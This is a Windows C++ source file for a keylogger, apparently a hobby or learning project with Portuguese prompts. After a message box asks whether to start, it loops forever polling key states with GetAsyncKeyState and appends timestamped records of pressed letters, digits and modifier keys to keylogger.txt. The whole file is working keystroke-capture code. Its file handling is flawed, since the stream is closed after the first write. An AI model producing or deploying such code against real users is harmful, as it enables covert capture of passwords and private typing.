#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <fstream>
#include <string>

#define TIME_ 10
#define BUFER__ 400

std::string getLocalTime() {
	time_t time_;

	std::time(&time_);
	tm* s = localtime(&time_);

	std::string time__ = std::to_string(s->tm_mday) + "/" + std::to_string(s->tm_mon + 1) +
		"/" + std::to_string(s->tm_year + 1900) + " [Horas:" + std::to_string(s->tm_hour) + 
		" Minutos: " + std::to_string(s->tm_min) + " Segundo: " + std::to_string(s->tm_sec) + 
		+ "]";

	return time__;
}

void logger() {
	std::ofstream arq;
	arq.open("keylogger.txt", std::ios::out | std::ios::app);

	BYTE c[256];
	if (GetAsyncKeyState(VK_CONTROL)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [CONTROL]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x08)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [BACKSPACE]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x09)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [TAB]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x0C)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [Chave CLEAR]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x0D)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [ENTER]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x10)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [SHIFT]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x12)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [ALT]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x13)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [PAUSE]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x14)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [CAPS LOCK]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x30)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [0]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x31)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [1]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x32)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [2]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x33)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [3]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x34)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [4]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x35)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [5]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x36)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [6]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x37)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [7]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x38)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [8]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x39)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [9]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x41)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [A]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x42)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " <<  ": [B]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x43)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [C]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x44)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [D]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x45)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [E]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x46)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [F]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x47)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [G]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x48)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [H]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x49)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [I]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4A)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [J]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4B)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [K]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4C)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [L]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4D)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [M]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4E)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [N]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x4F)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [O]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x50)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [P]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x51)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [Q]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x52)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [R]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x53)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [S]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x54)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [T]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x55)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [U]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x56)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [V]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x57)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [W]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x58)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [X]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x59)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [Y]\n";
		arq.close();
	}
	if (GetAsyncKeyState(0x5A)) {
		Sleep(TIME_);
		arq << "(" << getLocalTime() << ") " << ": [Z]\n";
		arq.close();
	}
}

int APIENTRY WinMain(_In_ HINSTANCE hinstance, _In_opt_ HINSTANCE hprevinstance, _In_ LPSTR lpcmdline, _In_ int cmdshow) {
	std::string c;
#ifdef _DEBUG
	c = "Modo debug on!";
#else
	c = "Modo release on!";
#endif

	c = "(" + c + ") Deseja abrir o keylogger?";

	int info = MessageBox(NULL, c.c_str(), "Keylogger", MB_OK | MB_OKCANCEL | MB_ICONQUESTION);

	switch (info)
	{
	case 1:
		for(;;){
			logger();
		}
	case 2:
		MessageBox(NULL, "Programa fechado!.", "Keylogger", MB_OK | MB_ICONQUESTION);
	}

	return 0;
}
